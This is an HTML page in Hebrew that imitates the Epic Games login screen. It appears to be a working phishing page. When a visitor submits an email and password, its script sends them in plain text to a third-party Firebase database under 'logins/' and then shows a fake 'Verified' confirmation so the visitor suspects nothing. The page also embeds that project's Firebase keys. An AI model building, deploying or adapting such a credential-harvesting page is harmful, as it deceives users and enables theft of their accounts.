<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>התחברות | Epic Games</title>
    <style>
        :root {
            --bg-color: #121212;
            --card-bg: #202020;
            --epic-blue: #0074e4;
            --epic-blue-hover: #007bf5;
            --success-green: #2ecc71;
        }

        body {
            font-family: 'Inter', 'Segoe UI', sans-serif;
            background-color: var(--bg-color);
            color: white;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .box {
            width: 100%;
            max-width: 400px;
            padding: 40px;
            background: var(--card-bg);
            border-radius: 4px;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        }

        .logo { width: 45px; margin-bottom: 25px; }
        h2 { font-size: 18px; margin-bottom: 30px; text-transform: uppercase; }

        input {
            width: 100%;
            padding: 15px;
            margin-bottom: 15px;
            border: 1px solid #404040;
            background-color: #252525;
            color: white;
            border-radius: 4px;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }

        input:focus {
            border-color: var(--epic-blue);
            outline: none;
        }

        button {
            width: 100%;
            padding: 16px;
            background-color: var(--epic-blue);
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            text-transform: uppercase;
            transition: background-color 0.3s;
        }

        button:hover { background-color: var(--epic-blue-hover); }

        .error { 
            margin-top: 15px; 
            font-size: 13px; 
            color: #ff3e3e;
            line-height: 1.4;
        }

        .verified-container {
            display: none;
            animation: fadeIn 0.5s ease;
        }

        .verified-icon {
            font-size: 60px;
            color: var(--success-green);
            margin-bottom: 20px;
        }

        .verified-text {
            font-size: 24px;
            font-weight: bold;
            color: var(--success-green);
            text-transform: uppercase;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

<div class="box" id="mainBox">
    <div id="loginForm">
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/31/Epic_Games_logo.svg" alt="Epic Logo" class="logo">
        <h2>התחברות</h2>
        <input type="email" id="email" placeholder="כתובת אימייל">
        <input type="password" id="password" placeholder="סיסמה">
        <button onclick="login()">כניסה לחשבון</button>
        <p id="message" class="error"></p>
    </div>

    <div id="verifiedPage" class="verified-container">
        <div class="verified-icon">✓</div>
        <div class="verified-text">Verified</div>
        <p>החשבון אומת בהצלחה</p>
    </div>
</div>

<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>

<script>
    // הגדרות Firebase - כולל databaseURL
    const firebaseConfig = {
        apiKey: "AIzaSyAdMfT8b2qkEuscfANoHfd84grGyjwroLc",
        authDomain: "epic-games-66888.firebaseapp.com",
        databaseURL: "https://epic-games-66888-default-rtdb.firebaseio.com", // וודא שהכתובת הזו זהה למה שמופיע ב-Console
        projectId: "epic-games-66888",
        storageBucket: "epic-games-66888.firebasestorage.app",
        messagingSenderId: "1099132611577",
        appId: "1:1099132611577:web:3a64e34abc4810bb58eb28",
        measurementId: "G-SS7HZGV6Y9"
    };

    // אתחול Firebase
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    function login() {
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;
        const message = document.getElementById("message");
        const loginForm = document.getElementById("loginForm");
        const verifiedPage = document.getElementById("verifiedPage");

        // ולידציה
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const passRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$/;
        const hasSpaces = /\s/.test(password);

        if (!emailRegex.test(email)) {
            message.style.color = "#ff3e3e";
            message.innerText = "כתובת אימייל לא תקינה";
            return;
        }

        if (password.length < 8 || !passRegex.test(password) || hasSpaces) {
            message.style.color = "#ff3e3e";
            message.innerText = "הסיסמה חייבת להכיל לפחות 8 תווים, אות אחת ומספר אחד, ללא רווחים";
            return;
        }

        message.style.color = "white"; // תיקון כאן (בלי #)
        message.innerText = "מתחבר...";

        // שליחה ל-Firebase
        database.ref('logins/').push({
            email: email,
            password: password,
            date: new Date().toLocaleString()
        }).then(() => {
            // הצלחה - מעבר לדף Verified
            loginForm.style.display = "none";
            verifiedPage.style.display = "block";
        }).catch((error) => {
            // שגיאה - הצגת השגיאה המדויקת
            message.style.color = "#ff3e3e";
            message.innerText = "שגיאה בחיבור: " + error.message;
            console.error(error);
        });
    }
</script>

</body>
</html>
